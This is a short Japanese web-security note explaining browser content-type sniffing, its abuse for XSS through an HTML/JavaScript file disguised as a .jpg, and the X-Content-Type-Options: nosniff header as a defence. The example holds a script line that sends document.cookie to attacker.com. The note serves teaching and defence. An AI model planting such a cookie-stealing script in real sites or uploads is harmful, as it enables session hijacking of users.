## HTML content type sniffing 
ブラウザは、送付されたHTMLのデータ内容から、その内容のタイプを推測し、それに該当する方法でレスポンスを使用する機能がある。通常ではHTMLのヘッダーに、そのHTMLデータのタイプを明記しているのがほとんどだが、データタイプの表記間違いや、そもそもデータタイプを記載していない場合にtype sniffingすることでレスポンスを正しく解釈することができる。
その一方、この機能を悪用して、わざとブラウザに勘違いするような記入の仕方でデータを入力するXSS攻撃手法がある。
それは、例えばテキストタイプのファイルに、実行可能スクリプトを埋め込み、ブラウザを誘導することでスクリプトを実行させる。
例えば下記のように、スクリプトを.jpgファイルとして保存すると、ブラウザがその.jpgファイルを読み込む時、中にある\<script>を認識し、スクリプトとして処理してしまう。
```html
<!-- Imagine this is saved as "profile-pic.jpg" but actually contains HTML/JavaScript -->
<html>
<body>
<script>
// Malicious code here
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
</body>
</html>
```

## X-Content-Type-Options
X-Content-Type-Optionsは、HTMLのヘッダーオプションの一つで、`nosniff`に設定すことで、ブラウザにレスポンスの内容ではなく、その規定したタイプで処理しようと指示することができる。
```http
HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
...
```